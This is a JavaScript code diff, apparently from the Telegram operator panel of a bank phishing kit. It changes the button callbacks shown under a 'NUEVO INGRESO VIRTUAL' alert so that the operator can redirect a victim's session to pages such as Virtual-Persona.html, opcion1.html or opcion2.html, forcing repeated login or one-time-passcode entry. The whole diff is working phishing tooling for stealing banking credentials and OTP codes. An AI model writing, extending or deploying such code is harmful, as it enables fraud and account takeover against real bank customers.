@@ -67,7 +67,7 @@ function kbBtn(text, data) {
 }
 
 function buttonsForStep(step, sessionId) {
-  if (step === 'virtualpersona') {
+  if (step === 'virtual') {
     return [
       kbBtn('🔁 Error Logo', { sessionId, action: 'redirect', redirect_to: 'Virtual-Persona.html' }),
       kbBtn('➡️ Siguiente', { sessionId, action: 'redirect', redirect_to: 'opcion1.html' })
@@ -116,11 +116,32 @@ const message = `🔒 NUEVO INGRESO VIRTUAL 🔒
 const buttons = {
   inline_keyboard: [
     [
-      { text: "❌ Error Logo", callback_data: `error_logo|${sessionId}` },
-      { text: "🔁 Intentar OTP", callback_data: `error_otp|${sessionId}` },
+      {
+        text: "❌ Error Logo",
+        callback_data: JSON.stringify({
+          sessionId,
+          action: "redirect",
+          redirect_to: "Virtual-Persona.html"
+        })
+      },
+      {
+        text: "🔁 Intentar OTP",
+        callback_data: JSON.stringify({
+          sessionId,
+          action: "redirect",
+          redirect_to: "opcion2.html"
+        })
+      }
     ],
     [
-      { text: "✅ Continuar", callback_data: `siguiente|${sessionId}` }
+      {
+        text: "✅ Continuar",
+        callback_data: JSON.stringify({
+          sessionId,
+          action: "redirect",
+          redirect_to: "opcion1.html"
+        })
+      }
     ]
   ]
 };
